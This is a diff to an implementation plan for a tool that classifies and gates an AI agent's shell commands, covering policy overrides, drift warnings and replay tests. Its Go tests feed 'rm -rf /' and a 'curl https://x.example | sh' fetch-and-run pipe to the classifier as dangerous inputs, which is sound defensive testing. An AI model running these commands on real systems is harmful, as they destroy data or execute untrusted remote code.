@@ -21,13 +21,14 @@
 
 ## File Structure
 
-- Create: `internal/policy/file.go` — `Override`, `File`, `File.Effective()`, `normalize`, `LoadFile`, `EffectiveFromBytes`, `DefaultFile`.
+- Create: `internal/policy/file.go` — `Override`, `File`, `File.Effective()`, `normalize`, `LoadFile`, `EffectiveFromBytes`, `DefaultFile`, `BaselineDriftIDs`.
 - Modify: `internal/policy/defaults.go` — extract `Baseline()`; redefine `Default()`.
 - Modify: `internal/policy/validate.go` — `SeedRuleIDs()` from `Baseline()`.
 - Modify: `internal/policy/policy.go` — rewire `Load()` through `normalize`+`Effective`.
 - Modify: `internal/policy/schema.json` — add `overrides`.
 - Modify: `internal/cli/init.go` — `seedPolicy` writes `DefaultFile()`.
-- Modify: `internal/cli/doctor.go` — drop `warnMissingSeedRules`, add `warnUnknownOverride`.
+- Modify: `internal/cli/doctor.go` — drop `warnMissingSeedRules` (in Task 4), add `warnUnknownOverride` + `warnBaselineDrift` (Task 7).
+- Modify: `cmd/argus/main.go` — `replayCandidate`'s `--version` snapshot branch routes through `EffectiveFromBytes` (Task 8).
 - Modify: `internal/web/closeloop.go` — persist thin `File`; `parsePolicy` → `EffectiveFromBytes`.
 - Modify: `internal/web/explain.go` — add `srv.loadFile()` helper.
 - Create: `internal/web/effective.go` — `GET /api/policy/effective` handler + response types.
@@ -338,6 +339,35 @@ func TestNormalizeThinRoundTrips(t *testing.T) {
 		t.Errorf("no user rules expected, got %d", len(f.Rules))
 	}
 }
+
+func TestNormalizeKeepsAllowRuleOnIDCollision(t *testing.T) {
+	// A user allowlist rule that reuses a baseline id must survive as a user
+	// rule, not be misread as a baseline copy and swallowed.
+	doc := []byte(`{"version":1,"rules":[{"id":"sudo","enabled":true,"allow":true,"tool":["Bash"],"reason":"x","match":{"raw":"^sudo -l$"}}]}`)
+	f, err := normalize(doc)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(f.Rules) != 1 || !f.Rules[0].Allow {
+		t.Errorf("allow rule colliding with a baseline id must be kept, got %+v", f.Rules)
+	}
+	if _, ok := f.Overrides["sudo"]; ok {
+		t.Error("an allow rule must not become a baseline override")
+	}
+}
+
+func TestBaselineDriftIDsFlagsNonMigratableEdit(t *testing.T) {
+	// git-danger with a hand-edited match regex (non-migratable) → drift.
+	doc := []byte(`{"version":2,"rules":[{"id":"git-danger","enabled":true,"severity":"medium","tool":["Bash"],"reason":"g","match":{"cmd":["git","hub"],"targetScorer":"git_danger"}}]}`)
+	got := BaselineDriftIDs(doc)
+	if len(got) != 1 || got[0] != "git-danger" {
+		t.Errorf("expected drift on git-danger, got %v", got)
+	}
+	// A thin file has no inline baselines → no drift.
+	if d := BaselineDriftIDs([]byte(`{"version":1,"overrides":{"sudo":{"enabled":false}},"rules":[]}`)); len(d) != 0 {
+		t.Errorf("thin file must report no drift, got %v", d)
+	}
+}
 ```
 
 Add to `internal/policy/policy_test.go`:
@@ -392,7 +422,7 @@ func normalize(b []byte) (File, error) {
 	}
 	for _, r := range raw.Rules {
 		b0, isBaseline := base[r.ID]
-		if !isBaseline {
+		if !isBaseline || r.Allow { // an allow rule is never a baseline, even on an id collision
 			out.Rules = append(out.Rules, r)
 			continue
 		}
@@ -407,8 +437,43 @@ func normalize(b []byte) (File, error) {
 		if ov.Enabled != nil || ov.Severity != "" {
 			out.Overrides[r.ID] = ov
 		}
+		// A match/reason/tool/contextEscalation edit has no override
+		// representation and is intentionally dropped (the binary owns those);
+		// BaselineDriftIDs surfaces it via doctor so the discard is not silent.
 	}
 	return out, nil
+}
+
+// BaselineDriftIDs reports the ids of inline baseline copies in a raw (old-
+// format) document that differ from the binary baseline in a field normalize
+// cannot migrate (match/reason/tool/contextEscalation). doctor warns on these
+// so an operator's superseded hand-edit is visible, not silently discarded.
+// Returns nil for a thin/new document (no inline baselines).
+func BaselineDriftIDs(b []byte) []string {
+	var raw File
+	if err := json.Unmarshal(b, &raw); err != nil {
+		return nil
+	}
+	base := map[string]Rule{}
+	for _, r := range Baseline() {
+		base[r.ID] = r
+	}
+	var drift []string
+	for _, r := range raw.Rules {
+		b0, ok := base[r.ID]
+		if !ok || r.Allow {
+			continue
+		}
+		// Compare only the non-migratable fields; enabled/severity are handled
+		// as overrides and are not "drift".
+		norm := r
+		norm.Enabled, norm.Severity = b0.Enabled, b0.Severity
+		if !reflect.DeepEqual(norm, b0) {
+			drift = append(drift, r.ID)
+		}
+	}
+	sort.Strings(drift)
+	return drift
 }
 
 // LoadFile reads, validates, and normalizes the on-disk document to its thin
@@ -454,9 +519,18 @@ func Load(path string) (Policy, error) {
 }
 ```
 
-Add `"encoding/json"` and `"fmt"` imports to `file.go` as needed.
+Add `"encoding/json"`, `"fmt"`, `"reflect"`, `"sort"` imports to `file.go` as needed.
 
-- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./...` (the gate/cli/web/replay suites still green — `Load` returns the same effective rules for an un-overridden file).
+- [ ] **Step 3b: Retire the now-impossible doctor check (keeps the suite green).**
+Rewiring `Load` to reassemble `Baseline()` means an empty-`rules` file now yields
+a policy containing every seed rule, so `warnMissingSeedRules` can never fire and
+its test `TestDoctor_SeedRuleWarn` (`internal/cli/doctor_test.go:14`) goes red at
+this commit. Delete `warnMissingSeedRules` (and its call site) from
+`internal/cli/doctor.go` and delete `TestDoctor_SeedRuleWarn` from
+`internal/cli/doctor_test.go`. (The replacement `warnUnknownOverride` /
+`warnBaselineDrift` land in Task 7.) `SeedRuleIDs()` stays — Task 7 reuses it.
+
+- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./...` (the gate/cli/web/replay suites still green — `Load` returns the same effective rules for an un-overridden file, and the stale doctor test is gone).
 
 - [ ] **Step 5: Commit** `feat(policy): normalize + LoadFile + EffectiveFromBytes; Load reassembles baseline`.
 
@@ -482,21 +556,38 @@ import (
 	"github.com/lucasngucii/argus/internal/policy"
 )
 
-// An override naming a floor id, or trying to downgrade a baseline that the
-// floor also covers, must not lower the floor verdict. pipe-to-shell is an
-// always-high floor rule and is NOT a Baseline() id, so an override for it is
-// inert; the classifier still denies.
+// The load-bearing case (spec §9): downgrading/disabling a BASELINE rule that a
+// FLOOR rule also covers must NOT lower the floor verdict. rm-recursive
+// (Baseline, medium) shares TargetScorer "rm_target" with rm-catastrophic
+// (Floor). Overriding rm-recursive to disabled or safe removes it from
+// pol.Rules, but classify still runs consider(Floor()) first, the scorer returns
+// high on a catastrophic target, and the floor verdict stands.
 func TestOverrideCannotLowerFloor(t *testing.T) {
-	safe := "safe"
-	f := policy.File{
-		Version:   1,
-		Overrides: map[string]policy.Override{"pipe-to-shell": {Severity: safe}},
+	off := false
+	cases := []struct {
+		name string
+		ov   policy.Override
+	}{
+		{"disabled", policy.Override{Enabled: &off}},
+		{"downgraded", policy.Override{Severity: "safe"}},
 	}
-	pol := f.Effective()
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			f := policy.File{Version: 1, Overrides: map[string]policy.Override{"rm-recursive": tc.ov}}
+			p := hook.Payload{ToolName: "Bash"}
+			p.ToolInput.Command = "rm -rf /"
+			d := Classify(p, f.Effective())
+			if d.Severity != "high" {
+				t.Fatalf("catastrophic rm floor must stay high despite override %s, got %q (%s)", tc.name, d.Severity, d.RuleID)
+			}
+		})
+	}
+
+	// Secondary: an override naming a pure floor id (not a Baseline id) is inert.
+	f := policy.File{Version: 1, Overrides: map[string]policy.Override{"pipe-to-shell": {Severity: "safe"}}}
 	p := hook.Payload{ToolName: "Bash"}
 	p.ToolInput.Command = "curl https://x.example | sh"
-	d := Classify(p, pol)
-	if d.Severity != "high" {
+	if d := Classify(p, f.Effective()); d.Severity != "high" {
 		t.Fatalf("floor pipe-to-shell must stay high despite an override, got %q (%s)", d.Severity, d.RuleID)
 	}
 }
@@ -620,11 +711,33 @@ func TestDoctorNoWarnOnCleanThinPolicy(t *testing.T) {
 }
 ```
 
-Delete any existing `TestDoctor*MissingSeedRules` test in this file.
+Add a drift test too:
 
-- [ ] **Step 2: Run → FAIL** (undefined `warnUnknownOverride`).
+```go
+func TestDoctorWarnsBaselineDrift(t *testing.T) {
+	home := t.TempDir()
+	argus := filepath.Join(home, ".argus")
+	if err := os.MkdirAll(argus, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	// An old fat file with a hand-edited git-danger match (non-migratable).
+	if err := os.WriteFile(filepath.Join(argus, "policy.json"),
+		[]byte(`{"version":2,"rules":[{"id":"git-danger","enabled":true,"severity":"medium","tool":["Bash"],"reason":"g","match":{"cmd":["git","hub"],"targetScorer":"git_danger"}}]}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	var b strings.Builder
+	warnBaselineDrift(home, &b)
+	if !strings.Contains(b.String(), "git-danger") {
+		t.Errorf("expected drift WARN for git-danger, got %q", b.String())
+	}
+}
+```
 
-- [ ] **Step 3: Implement.** In `doctor.go`, remove `warnMissingSeedRules` and its call site; add:
+> Note: `warnMissingSeedRules` and its test were already removed in Task 4 Step 3b — do not re-add them.
+
+- [ ] **Step 2: Run → FAIL** (undefined `warnUnknownOverride` / `warnBaselineDrift`).
+
+- [ ] **Step 3: Implement.** In `doctor.go`, add both warns and wire them into the same call site the old `warnMissingSeedRules` used:
 
 ```go
 // warnUnknownOverride prints a non-fatal WARN for any override that names a
@@ -651,9 +764,23 @@ func warnUnknownOverride(home string, w io.Writer) {
 		fmt.Fprintf(w, "WARN policy: override references unknown baseline rule: %s\n", strings.Join(unknown, ", "))
 	}
 }
+
+// warnBaselineDrift prints a non-fatal WARN when the raw policy file carries an
+// inline baseline copy customized in a field normalize cannot migrate (match /
+// reason / tool / contextEscalation) — surfacing the intended discard so an
+// operator's superseded hand-edit is visible. Does NOT change exit.
+func warnBaselineDrift(home string, w io.Writer) {
+	b, err := os.ReadFile(filepath.Join(home, ".argus", "policy.json"))
+	if err != nil {
+		return
+	}
+	if ids := policy.BaselineDriftIDs(b); len(ids) > 0 {
+		fmt.Fprintf(w, "WARN policy: baseline customization not migrated (binary definition now applies): %s\n", strings.Join(ids, ", "))
+	}
+}
 ```
 
-Update the caller (where `warnMissingSeedRules` was invoked) to call `warnUnknownOverride`. Add `"sort"` to imports.
+Update the caller (where `warnMissingSeedRules` was invoked) to call BOTH `warnUnknownOverride` and `warnBaselineDrift`. Add `"sort"` and `"os"` to imports if not already present.
 
 - [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./internal/cli/`.
 
@@ -668,17 +795,21 @@ Update the caller (where `warnMissingSeedRules` was invoked) to call `warnUnknow
 **Files:**
 - Modify: `internal/web/closeloop.go` (allowlist handler ~line 101, `parsePolicy` ~line 157)
 - Modify: `internal/web/explain.go` (add `loadFile` helper)
-- Test: `internal/web/closeloop_test.go`
+- Modify: `cmd/argus/main.go` (`replayCandidate` `--version` branch, ~line 161-178)
+- Test: `internal/web/closeloop_test.go`, `cmd/argus/main_test.go`
 
 **Interfaces:**
 - Consumes: `policy.LoadFile`, `policy.EffectiveFromBytes`, `policy.DefaultFile`.
 - Produces: `func (srv *Server) loadFile() policy.File`.
 
-- [ ] **Step 1: Write the failing test.** Add to `internal/web/closeloop_test.go` (follow the existing test's server-construction helper in that file):
+- [ ] **Step 1: Write the failing test.** The `internal/web` helper is `testServer(t, addr) (*Server, error)` (`server_test.go:16`); its policy path is the unexported `srv.policyPath` (same-package tests may read it — there is no returned `dir`). Add to `internal/web/closeloop_test.go`:
 
 ```go
 func TestAllowlistPersistsThinFile(t *testing.T) {
-	srv, dir := newTestServer(t) // reuse this file's existing helper; adapt name if different
+	srv, err := testServer(t, "127.0.0.1:4600")
+	if err != nil {
+		t.Fatal(err)
+	}
 	body := `{"tool":"Bash","command":"echo hi"}`
 	req := httptest.NewRequest(http.MethodPost, "/api/allowlist", strings.NewReader(body))
 	req.Header.Set("Content-Type", "application/json")
@@ -689,7 +820,7 @@ func TestAllowlistPersistsThinFile(t *testing.T) {
 	if rec.Code != http.StatusOK {
 		t.Fatalf("allowlist POST: %d %s", rec.Code, rec.Body.String())
 	}
-	written, err := os.ReadFile(filepath.Join(dir, "policy.json"))
+	written, err := os.ReadFile(srv.policyPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -754,9 +885,62 @@ func parsePolicy(body []byte) (policy.Policy, error) {
 }
 ```
 
-- [ ] **Step 4: Run → PASS**; full `CGO_ENABLED=0 go test ./internal/web/`.
+Fix the CLI `replay --version` snapshot path in `cmd/argus/main.go`. Today
+`replayCandidate`'s `ver > 0` branch does `policy.Validate(raw)` +
+`json.Unmarshal([]byte(raw), &p)` straight into a `policy.Policy` — so a **thin**
+snapshot (overrides + user rules only) re-scores with **no baselines**. Route it
+through the shared assembler instead:
 
-- [ ] **Step 5: Commit** `fix(web): allowlist + replay candidate operate on the thin policy file`.
+```go
+	if ver > 0 {
+		raw, err := st.PolicyVersionJSON(ver)
+		if err != nil {
+			return policy.Policy{}, fmt.Errorf("policy version %d: %w", ver, err)
+		}
+		return policy.EffectiveFromBytes([]byte(raw)) // validates + normalizes + assembles
+	}
+```
+
+(The `--policy FILE` branch already calls `policy.Load` → unchanged.) Drop the now-unused local `p`/`json`/`Validate` in that branch if they become unreferenced.
+
+Add a regression test in `cmd/argus/main_test.go` (package `main`) — a thin
+snapshot must re-score with baselines present:
+
+```go
+func TestReplayCandidateThinSnapshotAssemblesBaseline(t *testing.T) {
+	dir := t.TempDir()
+	st, err := store.Open(filepath.Join(dir, "argus.db"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer st.Close()
+	thin := `{"version":7,"overrides":{"sudo":{"enabled":false}},"rules":[]}`
+	sum := sha256.Sum256([]byte(thin))
+	if err := st.InsertPolicyVersion(7, "test", "thin", thin, hex.EncodeToString(sum[:])); err != nil {
+		t.Fatal(err)
+	}
+	cand, err := replayCandidate(st, dir, "", 7)
+	if err != nil {
+		t.Fatal(err)
+	}
+	got := map[string]bool{}
+	for _, r := range cand.Rules {
+		got[r.ID] = true
+	}
+	if !got["git-danger"] {
+		t.Error("thin snapshot must re-score with the current binary baseline (git-danger)")
+	}
+	if got["sudo"] {
+		t.Error("the snapshot's enabled:false override for sudo must be honored")
+	}
+}
+```
+
+> Verify `store.InsertPolicyVersion`'s signature and the `sha256`/`hex` imports against `internal/store` and existing usages (e.g. `internal/web/policy.go:111`) before running; match them exactly.
+
+- [ ] **Step 4: Run → PASS**; `CGO_ENABLED=0 go test ./internal/web/ ./cmd/argus/`.
+
+- [ ] **Step 5: Commit** `fix(web,cli): allowlist + replay candidate (web + --version) operate on the thin policy file`.
 
 ---
 
@@ -775,8 +959,11 @@ func parsePolicy(body []byte) (policy.Policy, error) {
 
 ```go
 func TestEffectiveEndpointShape(t *testing.T) {
-	srv, dir := newTestServer(t)
-	if err := os.WriteFile(filepath.Join(dir, "policy.json"),
+	srv, err := testServer(t, "127.0.0.1:4600")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(srv.policyPath,
 		[]byte(`{"version":1,"overrides":{"sudo":{"enabled":false}},"rules":[]}`), 0o644); err != nil {
 		t.Fatal(err)
 	}
@@ -916,7 +1103,9 @@ Confirm: toggling `sudo` off + setting `pkg-install-lifecycle` to `low` and savi
 
 ## Self-Review
 
-**Spec coverage:** §3 model → T1–T2 (Baseline/Override/File/Effective). §4 load + normalize → T4. §5 schema → T3. §2/§9 floor invariant → T5. §6 init → T6; doctor → T7. §7 web (effective API + editor) → T9–T10; the close-loop/replay thin-file correctness the spec implies → T8. §8 replay/snapshot normalization → T8 (`parsePolicy` → `EffectiveFromBytes`) + T4 (`Load`/`EffectiveFromBytes`). Every spec section maps to a task.
+**Spec coverage:** §3 model → T1–T2 (Baseline/Override/File/Effective). §4 load + normalize (incl. the `!r.Allow` id-collision guard and `BaselineDriftIDs`) → T4. §5 schema → T3. §2/§9 floor invariant (via the load-bearing `rm-recursive` override case) → T5. §6 init → T6; doctor (unknown-override + baseline-drift warns) → T7. §7 web (effective API + editor) → T9–T10; the close-loop/replay thin-file correctness the spec implies → T8. §8 replay/snapshot normalization → T8 (`parsePolicy` → `EffectiveFromBytes` in web **and** the CLI `--version` snapshot branch in `cmd/argus/main.go`) + T4 (`Load`/`EffectiveFromBytes`). Every spec section maps to a task.
+
+**Post-review fixes folded in (2 reviewers):** CLI `replay --version` thin-snapshot path (was a baseline-dropping blocker) → T8; the stale `warnMissingSeedRules`/`TestDoctor_SeedRuleWarn` that would go red at T4 → removed in T4 Step 3b; the real `testServer(t, addr)`/`srv.policyPath` web helper → T8/T9; the previously-inert floor golden → real `rm-recursive` case in T5; the M1 over-claim → honest scope in the spec + `BaselineDriftIDs` drift warn; the id-collision swallow → `!r.Allow` guard in T4.
 
 **Placeholder scan:** no TBD/TODO; each code step carries real Go/JSON/JS. The two frontend-shaped notes (T9 wrapper simplification, T10 UI) give concrete structure and an explicit end-to-end verification rather than "add a UI".
 
@@ -926,5 +1115,6 @@ Confirm: toggling `sudo` off + setting `pkg-install-lifecycle` to `low` and savi
 
 ## Open items for the maintainer
 
-1. `newTestServer(t)` / `policyPath` field names in `internal/web` tests are referenced generically — the implementer must match the actual helper + field names in that package (verify in `internal/web/*_test.go` and `server.go`).
-2. The `hook.Payload` construction in T5 must match the real struct (verify `internal/hook/payload.go` — mirror how existing `internal/classify` tests build a Bash payload).
+1. T5's `hook.Payload{ToolName:"Bash"}` + `p.ToolInput.Command = "..."` is confirmed against `internal/hook/payload.go` (Subject() returns the command for Bash). If the classify tests use a different helper, mirror it — but the shown construction compiles.
+2. T8's `store.InsertPolicyVersion` call and the `sha256`/`hex` imports must match `internal/store` (see the identical usage at `internal/web/policy.go:111`).
+3. T10 is a frontend task with no Go test; its guarantee is the served UI. Verify with `/run` or the **verify** skill driving the browser, per the Step 4 checklist.
